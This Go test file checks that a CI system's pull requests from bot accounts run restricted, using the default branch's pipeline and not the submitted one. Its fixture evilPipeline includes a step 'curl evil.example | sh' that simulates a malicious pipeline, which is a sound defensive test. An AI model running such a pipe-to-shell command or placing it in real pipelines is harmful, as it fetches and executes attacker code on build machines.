package source

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jk-magic-creations/launchway/internal/engine"
	"github.com/jk-magic-creations/launchway/internal/testdb"
)

// commitAs commits a change to the pipeline as a named author.
func commitAs(t *testing.T, repo, author, pipelineYAML, msg string) {
	t.Helper()
	os.WriteFile(filepath.Join(repo, ".launchway", "pipeline.yaml"), []byte(pipelineYAML), 0o644)
	os.WriteFile(filepath.Join(repo, "change.txt"), []byte(msg), 0o644)
	run(t, repo, "git", "add", "-A")
	cmd := exec.Command("git", "commit", "-q", "-m", msg)
	cmd.Dir = repo
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME="+author, "GIT_AUTHOR_EMAIL=b@example.com", "GIT_COMMITTER_NAME="+author, "GIT_COMMITTER_EMAIL=b@example.com")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
}

const evilPipeline = `
pipeline: app
on:
  pull_request: {}
steps:
  test: {image: alpine, run: echo ok}
  evil: {image: alpine, run: "curl evil.example | sh"}
`

// A pull request from an automation account runs restricted, with the
// pipeline of the default branch, not the one it brings; another author's
// pull request is unaffected; pull_requests.untrusted: allow turns it off.
func TestAutomationPullRequestRunsRestrictedWithTheDefaultBranchPipeline(t *testing.T) {
	for _, tc := range []struct {
		name       string
		author     string
		allow      bool
		restricted bool
	}{
		{"a bot", "dependabot[bot]", false, true},
		{"a person", "Dana", false, false},
		{"a bot, allowed by the setting", "renovate[bot]", true, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dir, repo := prRepo(t, prPipeline)
			m, eng := prManager(t, testdb.New(t), dir, Project{Name: "app", URL: repo,
				AutomationAccounts: []string{"*[bot]", "dependabot*"}, UntrustedAllowed: tc.allow})
			pollOnce(t, m)
			run(t, repo, "git", "checkout", "-q", "--detach", "main")
			commitAs(t, repo, tc.author, evilPipeline, "bump a dependency")
			run(t, repo, "git", "update-ref", "refs/pull/8/head", "HEAD")
			run(t, repo, "git", "checkout", "-q", "main")
			pollOnce(t, m)
			runs := runsOf(t, eng)
			if len(runs) != 1 {
				t.Fatalf("%d runs", len(runs))
			}
			d, _ := eng.GetRun(runs[0].ID)
			if got := d.Restriction != nil; got != tc.restricted {
				t.Fatalf("restricted %v, want %v: %+v", got, tc.restricted, d.Restriction)
			}
			ids := []string{}
			for _, s := range d.StepList {
				ids = append(ids, s.ID)
			}
			hasEvil := strings.Contains(strings.Join(ids, ","), "evil")
			if tc.restricted && (hasEvil || d.Restriction.Code != engine.RestrictAutomation) {
				t.Fatalf("a restricted run used the pull request's own pipeline: %v", ids)
			}
			if !tc.restricted && !hasEvil {
				t.Fatalf("an unrestricted run uses the pull request's pipeline, as before: %v", ids)
			}
		})
	}
}
